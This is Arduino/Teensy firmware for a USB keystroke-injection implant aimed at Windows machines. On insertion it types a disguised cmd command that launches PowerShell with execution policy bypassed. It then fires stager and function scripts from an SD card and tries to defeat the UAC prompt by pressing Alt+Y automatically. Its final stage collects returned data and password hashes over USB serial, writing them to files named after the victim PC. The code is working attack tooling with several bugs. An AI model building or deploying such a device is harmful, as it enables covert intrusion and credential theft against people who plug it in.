#include <Arduino.h>
#include <SD.h>
#include <SPI.h>
#include <stdlib.h>
#include "main.h"
#include "payload.h"


const int cs = 254;

int ledkeys(void)       {return int(keyboard_leds);}
bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
bool is_caps_on(void)   {return ((ledkeys() & 2) == 2) ? true : false;}
bool is_num_on(void)    {return ((ledkeys() & 1) == 1) ? true : false;}

Payload** payloads;
int payloadc = 0;


void blink_fast(int blinkrate,int delaytime)
{
	int blinkcounter=0;
	for(blinkcounter=0; blinkcounter!=blinkrate; blinkcounter++)
	{
		digitalWrite(LED_BUILTIN, HIGH);
		delay(delaytime);
		digitalWrite(LED_BUILTIN, LOW);
		delay(delaytime);
	}
}
// Wait for Windows to be ready before we start typing.

void wait_for_drivers(unsigned int speed)
{
	bool numLockTrap = is_num_on();
	while(numLockTrap == is_num_on())
	{
		blink_fast(5,80);
		Keyboard.set_key1(KEY_NUM_LOCK);
		Keyboard.send_now();
		Keyboard.set_modifier(0);
		Keyboard.set_key1(0);
		Keyboard.send_now();
		delay(speed);
	}
	Keyboard.set_key1(KEY_NUM_LOCK);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(speed);
}


void panic() { //not expected to return, signals error and locks processor
	Serial1.println("PANIC!");
	while(true){
		digitalWrite(LED_BUILTIN,HIGH);
		delay(5000);
		digitalWrite(LED_BUILTIN,LOW);
		delay(5000);
	}
}
int readline(char* dest, int len, usb_serial_class* port){
	int i;
	for (i = 0; i<len && dest[i]!='\n'; i++){
		while (true){
			if ((*port).available() > 0 ){
				dest[i]=(*port).read();
				break;
			}
		}
	}
	dest[i+1]='\0'; //terminate string
	if (i >= len){
		return -1; //buffer too small
	}
	return (i+1); //return length
}
void setup() {
	delay(100); //delay 100ms, makes it work for some reason
	Serial1.begin(115200); //hardware UART for debug
	Serial1.println("Init!");
	pinMode(LED_BUILTIN, OUTPUT);
	digitalWrite(LED_BUILTIN, HIGH);
	delay(500);
	digitalWrite(LED_BUILTIN, LOW);
	Serial1.println("USB Serial Init...");
	Serial.begin(115200);
	Serial1.print("USB Serial Starting...");
	while(!Serial){
		digitalWrite(LED_BUILTIN, HIGH);
		Serial1.print(".");
		delay(100); //wait for USB serial to init
		digitalWrite(LED_BUILTIN,LOW);
		delay(100); //blink until serial init
	}
	Serial1.println("\nUSB Serial Ready.");
	Serial1.println("Starting SD!");
	if(!SD.begin(cs)){
		Serial1.println("SD ERR");
		panic();// Failed to initialize SD card, fall to error condition
	}
	Serial1.println("SD Started!");
	wait_for_drivers(100); //probe numlock with 100ms delay
	bool capsTrap = is_caps_on();
	Serial1.println("CapsTrap Active.");
	while(!capsTrap == is_caps_on()){ //TODO: actually make this work, it falls right through
		blink_fast(2,100); //check every 200ms for if scroll lock changed, that's our signal to go
	}
	if (is_caps_on()){
			Keyboard.set_key1(KEY_CAPS_LOCK);
			Keyboard.send_now();
			Keyboard.set_modifier(0);
			Keyboard.set_key1(0);
			Keyboard.send_now();
	}
	Serial1.println("Parsing Config...");
	readconfig();
	Serial1.println("Config Parsed. Firing now...");
	startPowershell();
	Payload* functions = new Payload("functions.ps1");
	functions->fire(); //we use this again, so don't free it
	Payload* stager = new Payload("stager.ps1");
	stager->fire(); //fire stager
	char* init = (char*)malloc(5);
	readline(init, 5, &Serial);
	if(strcmp(init,"init")){
		Serial.println("ack");
	} else {
		panic(); //Didn't get init from stager!
	}
	free(init);
	char* pcname = (char*)malloc(16);
	readline(pcname, 16, &Serial);
	char* comport = (char*)malloc(6);
	readline(comport, 6, &Serial);
//	char* uacstatus = (char*)malloc();
//	readline(uacstatus, , *Serial);  //TODO: parse return of this function and figure out how to bypass
	char* adminstatus = (char*)malloc(6);
	readline(adminstatus, 6, &Serial);
	//TODO: add UAC bypass if user is admin but program is not
	if (strcmp(adminstatus, "False")){
//		prepsecondstage((char*)secondstage_ps1, secondstage_ps1_len, comport); //tell stager the COM port to use
		UACBypass("psadmin.ps1");
		functions->fire(); //add the functions to the new PS session
		Payload* smallstage = new Payload("smallstager.ps1", comport); //give small stager a COM port to work with
		smallstage->fire();
	}
	for(int i = 0; i<payloadc; i++){
		payloads[i]->fire();
		if(payloads[i]->doesreturn())
		payload_rcv(payloads[i], pcname); //listen for returned value;
	}

}

void prepsecondstage(char* stage, int len, char* comport){
	char* offset=(stage+10); //skip $comport="
	sprintf(offset, "%s5", comport);
	offset[5]='"'; //replace the null terminator with closing parenthesis so deployment doesn't choke
}

void readconfig(){
	File conf = SD.open("config.txt");
	char* line = (char*)malloc(100);
	bool run=true;
	char* filename = (char*)malloc(50);
	char* ext = (char*)malloc(3);
	char* magic = (char*)malloc(50);
	while (run){
		for(int i = 0; i<100; i++){
			line[i]=conf.read();
			Serial.print(line[i]);
			if (line[i] == '\r' || line[i] == '\n' || line[i]=='\0'){
				line[i]= '\0';
				if(i==0 && line[i]== '\0'){
					goto breakloop; //end of the config file, stop the parseloop
				}
				break;
			}
		}
		Payload* load = new Payload(filename);
		int offset = 0;
		for (uint i=0; i<strlen(line); i++){
			if(line[i]==','){
				offset=(i+1);
				filename[i]='\0';
				break;
			}
			if(line[i]=='\0'){
				load->doesreturn(false);//config implies function does not return.
				if(i == 0){ //first byte of line is a null byte
					run=false; //out of config
					goto breakloop;
				}
				offset = -1; //tell future things that we've reached EOL
				filename[i]='\0';
				break;
			}
			filename[i]=line[i];
		}
		if (offset > 0) {
			load->doesreturn(true); //this is only hit if the config implies data return
			for (uint i = 0; i < strlen(line); i++) {
				if (line[i] == ',') {
					offset = (i + 1);
					magic[i] = '\0';
					break;
				}
				if (line[i] == '\0') {
					offset = -1; //tell future things that we've reached EOL
					magic[i] = '\0';
					break;
				}
				magic[i] = line[i + offset];
			}
		}
		if (offset > 0) {
			for (uint i = 0; i < strlen(line); i++) {
				if (line[i] == ',') {
					offset = (i + 1);
					ext[i] = '\0';
					break;
				}
				if (line[i] == '\0') {
					offset = -1; //tell future things that we've reached EOL
					ext[i] = '\0'; //terminate the string
					break;
				}
				ext[i] = line[i + offset];
			}
		}
		Serial1.printf("Payload %d: %s\n",(payloadc+1),filename);
		load->setmagic(magic);
		load->setext(ext);
		if (payloadc ==0){
			payloads = (Payload**)malloc(sizeof(Payload)); //Allocate stack
		}else {
			realloc(payloads, sizeof(payloads)+sizeof(Payload*)); //add a space onto payload stack
		}
		payloadc++;
		payloads[payloadc-1] = load; //put the new payload object into the array

	}
	breakloop: //end of the loop
	free(line);
	free(filename);
	free(magic);
	free(ext);
	conf.close();
}

void UACBypass(const char* payload){
	Payload* uacbypass = new Payload(payload);
	uacbypass->fire();
	delay(2000); //wait 2 seconds for UAC prompt
	Keyboard.set_modifier(MODIFIERKEY_ALT);
	Keyboard.set_key1(KEY_Y);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(200); //wait for PS to spool up;
}

void payload_rcv(Payload* load, const char* pcname){
	char* filename = (char*)malloc(50);
	strcat(filename, pcname);
	strcat(filename, load->getext());
	char* magic = (char*)malloc(sizeof(load->getmagic()+6)); //add 6 bytes for _START or _END
	sprintf(magic, "%s_START", load->getmagic());
	char buf[101];
	readline(buf, 101, &Serial);
	if (!strcmp(buf, magic)){
		panic(); //magic recieved didn't match
	}
	sprintf(magic, "%s_END", load->getmagic());//we clobber the magic string
	File outfile = SD.open(filename, O_RDWR); //we want read/write
	while (true){
		readline(buf, 101, &Serial);
		if (strcmp(buf, magic)){
			break; //end magic recived
		}
		outfile.print(buf); //doesn't care that buf is comparativley huge
	}
	outfile.close();
	free(magic);
	free(filename);
}

void hash_rcv(char* filename){
	char* buffer = (char*)malloc(100); //give readline plenty of room to work with
	File hashfile = SD.open(filename, FILE_WRITE);
	while(true){ //we don't know how many hashes we have, so loop infinitely
		readline(buffer, 100, &Serial); //will overwrite previous string in buffer
		if(strcmp(buffer,"HASHEND")){ //if it's the end magic stop and return
			break;
		}
		hashfile.println(buffer); //doesn't care about the garbage at the end, stops at first \0
	}
	hashfile.close();  //we're done, close the file
	free(buffer); //we won't be using this anymore
}

void loop() {
	digitalWrite(LED_BUILTIN, HIGH);
	delay(2000);
	digitalWrite(LED_BUILTIN, LOW);
	delay(2000);
}

void startPowershell(){
	loop(); //one blink
	Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
	Keyboard.set_key1((unsigned int)KEY_R);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(200); //wait for run prompt
	Keyboard.println("cmd.exe/T:01 /K mode CON: COLS=15 LINES=1");
	delay(500);
	Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
	Keyboard.println("%PWRSHLXDD% -ExecutionPolicy Bypass"); //pick powershell appropriate to target arch
	delay(500); //wait for PS window
	loop(); //blink
}
void echoPayload(char* load, int len){
	Keyboard.println(load); //use println to hit enter for us
}